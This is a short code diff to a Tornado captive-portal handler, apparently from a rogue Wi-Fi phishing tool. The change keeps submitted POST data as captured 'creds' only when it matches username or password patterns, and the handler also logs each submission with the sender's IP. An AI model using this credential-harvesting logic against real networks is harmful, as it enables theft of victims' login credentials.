@@ -1,5 +1,6 @@
 import logging
 import json
+import re
 from tornado.escape import json_decode
 import tornado.ioloop
 import tornado.web
@@ -129,9 +130,10 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
                 # record the post requests in the logging file
                 logger.info("POST request from %s with %s",
                             self.request.remote_ip, post_data)
-
-            creds.append(post_data)
-            terminate = True
+            if re.search(constants.REGEX_PWD, post_data, re.IGNORECASE) or \
+            re.search(constants.REGEX_UNAME, post_data, re.IGNORECASE):
+                creds.append(post_data)
+                terminate = True
 
         requested_file = self.request.path[1:]
         template_directory = template.get_path()
